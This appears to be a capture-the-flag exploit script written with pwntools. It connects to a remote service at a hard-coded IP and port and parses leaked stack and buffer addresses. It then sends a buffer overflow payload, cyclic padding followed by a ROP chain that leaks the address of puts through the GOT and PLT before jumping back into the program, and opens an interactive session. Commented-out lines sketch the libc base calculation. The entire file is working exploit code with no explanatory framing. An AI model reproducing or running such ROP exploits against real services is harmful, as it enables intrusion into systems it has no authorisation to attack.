import struct
from pwn import *

def leak():
    got_puts = 0x404018
    pop_rdi = 0x4013e3
    plt_puts = 0x4010b0
    syscall = 0x2584d
    chain = b''.join(map(p64,[pop_rdi, got_puts, plt_puts, syscall]))
    return chain


io =  remote('107.21.135.41', 6666)

io.recvuntil(b'base pointer: ')
bp = int(io.recvline(keepends=False),16)
print(bp)

io.recvuntil(b'will be stored: ')
buf = int(io.recvline(keepends=False),16)
print(buf)

# io.recvuntil(b'your buffer:')


exploit = cyclic(bp+8-buf) + leak() + p64(0x4012b9)


# leaked_bytes = io.recv()
# print(leaked_bytes)
# leaked_puts = u64(leaked_bytes.ljust(8,b'\0'))
# print(leaked_puts)
# base = leaked_puts - 0x875a0

io.sendline(exploit)

io.interactive()